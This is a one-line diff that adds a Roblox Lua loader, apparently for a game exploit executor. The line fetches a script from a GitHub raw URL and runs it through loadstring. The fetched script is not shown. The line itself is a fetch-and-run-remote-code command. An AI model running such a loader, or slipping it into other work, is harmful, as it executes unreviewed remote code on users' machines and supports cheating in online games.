@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kingmatnokh5241-bot/Kingdom-World/refs/heads/main/script.lua"))()
